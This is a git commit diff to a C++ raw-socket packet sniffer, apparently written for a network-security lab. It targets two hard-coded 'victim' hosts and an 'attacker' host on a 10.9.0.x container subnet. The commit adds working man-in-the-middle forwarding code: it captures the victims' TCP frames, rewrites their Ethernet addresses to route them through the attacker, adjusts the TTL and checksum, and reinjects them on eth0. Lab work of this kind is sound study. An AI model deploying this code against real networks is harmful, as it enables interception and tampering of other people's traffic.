b3bd85b196142be554dd3c09aff0b3afe570a42b
Raihan Rasheed Apurbo <apurbo97@gmail.com>
2021-07-10 18:44:19 +0600

    filter parser done, now debuggin forwarding

--- runForGUIHost.sh
+++ runForGUIHost.sh
@@ -1,4 +1,4 @@
-g++ sniffer.cpp -o sniffer
+g++ -w sniffer.cpp -o sniffer
 sudo ./sniffer
 #without sudo it doesn't work in ubuntu 20.0.lts
 #but in container we might need to remove sudo
--- sniffer.cpp
+++ sniffer.cpp
@@ -6,11 +6,17 @@
 #include <unistd.h> // close()
 #include <linux/ip.h> // for iphdr
 #include <linux/tcp.h> // for tcphdr
+#include <linux/if_packet.h> // for sockaddr_ll
+#include <sys/ioctl.h> // for ioctl
+#include <net/if.h> // for freq
 using namespace std;
 unsigned char vicitim1MAC[6];
 unsigned char vicitim2MAC[6];
+unsigned char attackerMAC[6];
 uint32_t victim1IP;
 uint32_t victim2IP;
+uint32_t attackerIP;
+int rawSocket;
 
 void printPacket(unsigned char* buf, int bufSize)
 {
@@ -33,6 +39,203 @@ void printUnsignedCharArr(char *verbose, unsigned char* buf, int bufSize)
         printf("%.2x ",t);
     }
     cout<<endl;
+}
+
+int parsePacket(unsigned char* buf, int bufSize)
+{
+
+    // struct ethhdr *eth = (struct ethhdr *)buf;
+    // printf("Ethernet Header: \n");
+    // printf("Destination MAC: %s",eth->h_dest);
+    // printf("Source MAC: %s",eth->h_source);
+    // printf("Payload Type: %x",eth->h_proto);
+    struct ethhdr* ethHeader;
+    // stringstream ss;
+    if(bufSize >= sizeof(struct ethhdr))
+    {
+        ethHeader = (struct ethhdr*) buf;
+        printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
+        printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
+        printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
+        printUnsignedCharArr("victim1: ", vicitim1MAC,6);
+        printUnsignedCharArr("victim2: ", vicitim2MAC,6);
+        // cout<<"hi"<<endl;
+        // cout<<atoi((char *)ethHeader->h_source)<<endl;
+        
+    }
+    else
+    {
+        printf("Ethernet header parsing failed\n");
+        return -5;
+    }
+
+    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
+    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
+    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
+    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
+    
+    // cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<endl;
+    if((t1||t2||t3||t4) == false)
+    {
+        cout<<"Not a victim packet so won't be parse"<<endl;
+        return -5;
+    }
+
+    struct iphdr* ipHeader; 
+    uint16_t ipv4Protocol = 0x0800;
+    if(ntohs(ethHeader->h_proto) == ipv4Protocol) // ipv4 ethertype
+    {
+        if(bufSize >= (sizeof(struct ethhdr) + sizeof(struct iphdr)))
+        {
+            ipHeader = (struct iphdr*) (buf+sizeof(struct ethhdr));
+            printf("Destination IP: %x\n", ntohl(ipHeader->daddr));
+            printf("Source IP: %x\n", ntohl(ipHeader->saddr));
+           
+        }
+    }
+    else
+    {
+        cout<<"Not an IP packet so won't be parsing"<<endl;
+        return -5;
+    }
+
+    
+
+    struct tcphdr *tcpHeader;
+    unsigned char tcpProtocol = 0x06;
+    if(ipHeader->protocol== tcpProtocol) // tcp packet
+    {
+        if(bufSize >= (sizeof(struct ethhdr) + ipHeader->ihl * 4) + sizeof(struct tcphdr))
+        {
+            tcpHeader = (struct tcphdr*) (buf + sizeof(struct ethhdr) + ipHeader->ihl * 4);
+            printf("Destination Port: %d\n",ntohs(tcpHeader->dest));
+            printf("Source Port: %d\n",ntohs(tcpHeader->source));
+        }
+    }
+    else
+    {
+        cout<<"Not an TCP packet so won't be parsing"<<endl;
+        return -5;
+    }
+    unsigned char *payload;
+    int payloadLength = 0;
+    bool payloadFound = true;
+    if(bufSize > sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4)
+    {
+        payload = buf + sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4;
+        payloadLength = bufSize - (sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4);
+        cout<<"Payload size: "<<payloadLength<<endl;
+        printUnsignedCharArr("Application Layer Data: ",payload,payloadLength);
+    }
+    else
+    {
+        cout<<"No payload found"<<endl;
+        payloadFound = false;
+        
+    }
+
+    
+    
+
+    
+
+
+
+
+    return 0;
+    
+}
+
+unsigned short computeIPChecksum(unsigned char *header, int len)
+{
+    long sum = 0;
+    unsigned short *ipHeader = (unsigned short *) header;
+
+    while(len>1)
+    {
+        sum += *ipHeader;
+        ipHeader++;
+        if(sum & 0x80000000)
+        {
+            sum = (sum & 0xFFFF) + (sum >> 16);
+        }
+        len -= 2;
+    }
+
+    if(len)
+    {
+        sum += *ipHeader;
+    }
+
+    while(sum>>16)
+    {
+        sum = (sum & 0xFFFF) + (sum>>16);
+    }
+
+    return ~sum;
+
+}
+
+void forwardPacket(unsigned char* buf, int bufSize)
+{
+    cout<<"inside forwardPacket"<<endl;
+    unsigned char* myPacket = new unsigned char[bufSize];
+    memcpy(myPacket,buf,bufSize);
+
+    struct ethhdr* ethHeader;
+    // stringstream ss;
+    if(bufSize >= sizeof(struct ethhdr))
+    {
+        ethHeader = (struct ethhdr*) myPacket;
+        // printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
+        // printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
+        // printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
+        // printUnsignedCharArr("victim1: ", vicitim1MAC,6);
+        // printUnsignedCharArr("victim2: ", vicitim2MAC,6);
+        // cout<<"hi"<<endl;
+        // cout<<atoi((char *)ethHeader->h_source)<<endl;
+        
+    }
+
+    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
+    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
+    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
+    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
+    bool t5 = memcmp(ethHeader->h_dest,attackerMAC,6)==0;
+    cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<" "<<t5<<endl;
+    // if((t1||t2||t3||t4) == false)
+    // {
+    //     cout<<"Not a victim packet so won't be parse"<<endl;
+    //     return -5;
+    // }
+    if(t1 && t5)
+    {
+        memcpy(ethHeader->h_source,attackerMAC,6);
+        memcpy(ethHeader->h_dest,vicitim2MAC,6);
+        
+    }
+    else if(t2 && t5)
+    {
+        memcpy(ethHeader->h_source,attackerMAC,6);
+        memcpy(ethHeader->h_dest,vicitim1MAC,6);
+    }
+
+    struct iphdr *ipHeader = (struct iphdr*)(myPacket + sizeof(struct ethhdr));
+    ipHeader->ttl = ipHeader->ttl - 1;
+    ipHeader->check = 0;
+    ipHeader->check = computeIPChecksum((unsigned char*)ipHeader,ipHeader->ihl*4);
+    // cout<<"calling parse packet"<<endl;
+    // parsePacket(myPacket,bufSize);
+    // cout<<"forward closing"<<endl;
+    cout<<"sending"<<endl;
+    parsePacket(myPacket,bufSize);
+    cout<<"total sent: "<<write(rawSocket, myPacket, bufSize)<<endl;
+    cout<<"forwarding completed"<<endl;
+
+    
+
+    delete[] myPacket;
+    
 }
 
 int filterPacket(unsigned char* buf, int bufSize)
@@ -120,135 +323,15 @@ int filterPacket(unsigned char* buf, int bufSize)
     // cout<<t11<<" "<<t22<<" "<<t33<<" "<<t44<<endl;
     if(t11 && t44)
     {
-        // cout<<"from victim2 to victim1 packet"<<endl;
-    }
-    else if(t22 && t33)
-    {
-        // cout<<"from victim1 to victim2 packet"<<endl;
-    }
-    else
-    {
-        // cout<<"not a packet from victim1 to victim2 so won't be injecting packet"<<endl;
-        return -5;
-    }
-    
-
-    
-
-
-
-
-    return 0;
-    
-}
-
-int parsePacket(unsigned char* buf, int bufSize)
-{
-
-    // struct ethhdr *eth = (struct ethhdr *)buf;
-    // printf("Ethernet Header: \n");
-    // printf("Destination MAC: %s",eth->h_dest);
-    // printf("Source MAC: %s",eth->h_source);
-    // printf("Payload Type: %x",eth->h_proto);
-    struct ethhdr* ethHeader;
-    stringstream ss;
-    if(bufSize >= sizeof(struct ethhdr))
-    {
-        ethHeader = (struct ethhdr*) buf;
-        printUnsignedCharArr("Destination MAC: ",ethHeader->h_dest,6);
-        printUnsignedCharArr("Source MAC: ",ethHeader->h_source,6);
-        printUnsignedCharArr("Protocol Type: ",(unsigned char*)&ethHeader->h_proto,2);
-        printUnsignedCharArr("victim1: ", vicitim1MAC,6);
-        printUnsignedCharArr("victim2: ", vicitim2MAC,6);
-        // cout<<"hi"<<endl;
-        // cout<<atoi((char *)ethHeader->h_source)<<endl;
-        
-    }
-    else
-    {
-        printf("Ethernet header parsing failed\n");
-        return -5;
-    }
-
-    bool t1 = memcmp(ethHeader->h_source,vicitim1MAC,6)==0;
-    bool t2 = memcmp(ethHeader->h_source,vicitim2MAC,6)==0;
-    bool t3 = memcmp(ethHeader->h_dest,vicitim1MAC,6)==0;
-    bool t4 = memcmp(ethHeader->h_dest,vicitim2MAC,6)==0;
-    
-    // cout<<t1<<" "<<t2<<" "<<t3<<" "<<t4<<endl;
-    if((t1||t2||t3||t4) == false)
-    {
-        cout<<"Not a victim packet so won't be parse"<<endl;
-        return -5;
-    }
-
-    struct iphdr* ipHeader; 
-    uint16_t ipv4Protocol = 0x0800;
-    if(ntohs(ethHeader->h_proto) == ipv4Protocol) // ipv4 ethertype
-    {
-        if(bufSize >= (sizeof(struct ethhdr) + sizeof(struct iphdr)))
-        {
-            ipHeader = (struct iphdr*) (buf+sizeof(struct ethhdr));
-            printf("Destination IP: %x\n", ntohl(ipHeader->daddr));
-            printf("Source IP: %x\n", ntohl(ipHeader->saddr));
-           
-        }
-    }
-    else
-    {
-        cout<<"Not an IP packet so won't be parsing"<<endl;
-        return -5;
-    }
-
-    
-
-    struct tcphdr *tcpHeader;
-    unsigned char tcpProtocol = 0x06;
-    if(ipHeader->protocol== tcpProtocol) // tcp packet
-    {
-        if(bufSize >= (sizeof(struct ethhdr) + ipHeader->ihl * 4) + sizeof(struct tcphdr))
-        {
-            tcpHeader = (struct tcphdr*) (buf + sizeof(struct ethhdr) + ipHeader->ihl * 4);
-            printf("Destination Port: %d\n",ntohs(tcpHeader->dest));
-            printf("Source Port: %d\n",ntohs(tcpHeader->source));
-        }
-    }
-    else
-    {
-        cout<<"Not an TCP packet so won't be parsing"<<endl;
-        return -5;
-    }
-    unsigned char *payload;
-    int payloadLength = 0;
-    bool payloadFound = true;
-    if(bufSize > sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4)
-    {
-        payload = buf + sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4;
-        payloadLength = bufSize - (sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4);
-        cout<<"Payload size: "<<payloadLength<<endl;
-        printUnsignedCharArr("Application Layer Data: ",payload,payloadLength);
-    }
-    else
-    {
-        cout<<"No payload found"<<endl;
-        payloadFound = false;
-        
-    }
-
-    bool t11 = victim1IP == ntohl(ipHeader->daddr);
-    bool t22 = victim1IP == ntohl(ipHeader->saddr);
-    bool t33 = victim2IP == ntohl(ipHeader->daddr);
-    bool t44 = victim2IP == ntohl(ipHeader->saddr);
-    // cout<<t11<<" "<<t22<<" "<<t33<<" "<<t44<<endl;
-    if(t11 && t44)
-    {
         cout<<"from victim2 to victim1 packet"<<endl;
-        // forwardPacket(buf,bufSize);
+        parsePacket(buf,bufSize);
+        forwardPacket(buf,bufSize);
     }
     else if(t22 && t33)
     {
         cout<<"from victim1 to victim2 packet"<<endl;
-        // forwardPacket(buf,bufSize);
+        parsePacket(buf,bufSize);
+        forwardPacket(buf,bufSize);
         // changePacket(buf,bufSize);
     }
     else
@@ -267,14 +350,46 @@ int parsePacket(unsigned char* buf, int bufSize)
     
 }
 
+int bindRawSocketToInterface(char *device, int rawSocket)
+{
+    cout<<"inside bind socket"<<endl;
+    struct sockaddr_ll sll;
+    struct ifreq ifr;
+    bzero(&sll,sizeof(sll));
+    bzero(&ifr,sizeof(ifr));
+
+    strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
+    if((ioctl(rawSocket, SIOCGIFINDEX, &ifr)) == -1 )
+    {
+        cout<<"error getting interface index"<<endl;
+        exit(-1);
+    }
+
+    sll.sll_family = PF_PACKET;
+    sll.sll_ifindex = ifr.ifr_ifindex;
+    sll.sll_protocol = htons(ETH_P_ALL);
+    cout<<"calling bind"<<endl;
+    if((bind(rawSocket, (struct sockaddr *)&sll, sizeof(sll)))==-1)
+    {
+        cout<<"error binding raw socket to interface"<<endl;
+        exit(-1);
+    }
+    cout<<"exiting bind"<<endl;
+    return 1;
+
+}
+
 int main()
 {
     unsigned char temp1[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x05};
     memcpy(vicitim1MAC, temp1 , 6);
     unsigned char temp2[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x06};
     memcpy(vicitim2MAC, temp2 , 6);
-    victim1IP=0xa090005;
-    victim2IP=0xa090006;
+    unsigned char temp3[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x69};
+    memcpy(attackerMAC, temp3 , 6);
+    victim1IP=0xa090005; // 10.9.0.5
+    victim2IP=0xa090006; // 10.9.0.6
+    attackerIP=0xa090069; // 10.9.0.105
     // Destination MAC: 02 42 0a 09 00 06 
     // Source MAC: 02 42 0a 09 00 69 
     // Protocol Type: 08 00 
@@ -288,10 +403,15 @@ int main()
 
     size_t pktBufSize = 10*1024;
     unsigned char pktBuf[pktBufSize];// 10kb space // has to be unsigned otherwise prints bad hex dump
-    int rawSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    rawSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if(rawSocket<0)
     {
         cout<<"kill meh"<<endl;
+        return -5;
+    }
+    if(bindRawSocketToInterface("eth0", rawSocket)!=1)
+    {
+        cout<<"kill meh again"<<endl;
         return -5;
     }
     cout<<"Socket opened successfully"<<endl;
@@ -309,7 +429,7 @@ int main()
         // printPacket(pktBuf,sizeOfPkt);
         if(filterPacket(pktBuf,sizeOfPkt)==0)
         {
-            parsePacket(pktBuf,sizeOfPkt);
+            // parsePacket(pktBuf,sizeOfPkt);
         }
     }
     close(rawSocket);
